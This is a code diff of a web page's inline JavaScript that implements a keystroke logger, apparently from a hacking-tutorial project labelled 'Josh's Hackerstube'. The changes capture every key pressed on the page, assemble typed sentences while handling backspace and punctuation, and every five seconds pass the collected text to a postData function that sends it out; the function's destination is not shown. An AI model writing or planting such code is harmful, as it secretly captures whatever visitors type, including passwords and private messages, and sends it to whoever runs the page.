@@ -8,36 +8,42 @@
 <body>
 
   <script type="text/javascript">
-      let word = "";
       let sentence = "";
       let text = "";
 
       let bodyTemplate = {
-        "keyword": "Joshs Hackerstube",
+        "keyword": "[Josh's Hackerstube]",
         "payload": ""
       }
 
       document.onkeydown = e => {
-        let character_code = event.which || event.keyCode;
-        let character_value = String.fromCharCode(character_code);
+        console.clear()
+        console.log("Key:", e.key, "Code:", e.keyCode)
+        console.log("Sentence: " + sentence);
 
-        console.log(character_code + " " + character_value);
-
-        word = word + character_value;
-
-        if(character_code == 32)
-        {
-            console.log("Word: " + word);
-            sentence = sentence + word;
-            word = "";
-        }
-
-        if(sentence != "" && (character_code == 13 || character_code == 190))
-        {
-            console.log("Sentence: " + sentence);
-            text = text + sentence + word;
-            word = "";
-            sentence = "";
+        switch (e.keyCode) {
+            // Filter unwanted characters
+            case 16: // Shift
+            case 20: // Caps
+            case 17: // Ctrl
+              break;
+            // Remove last character on BACKSPACE
+            case 8:
+                sentence = sentence.slice(0, -1);
+                break;
+            // Set text after sentence END
+            case 190:   // .
+            case 221:   // !
+            case 219:   // ?
+              sentence = sentence + e.key;
+            case 13:    // Enter
+            case 9:     // Tab
+              text = text + sentence;
+              sentence = "";
+              break;
+            // Add character to word
+            default:
+                sentence = sentence + e.key;
         }
       };
 
@@ -45,9 +51,7 @@
         if(text.length > 0)
         {
             console.log("Text for submission: " + text)
-
             postData(text);
-
             text = ""; sentence = ""; word = "";
         }
       }, 5000)
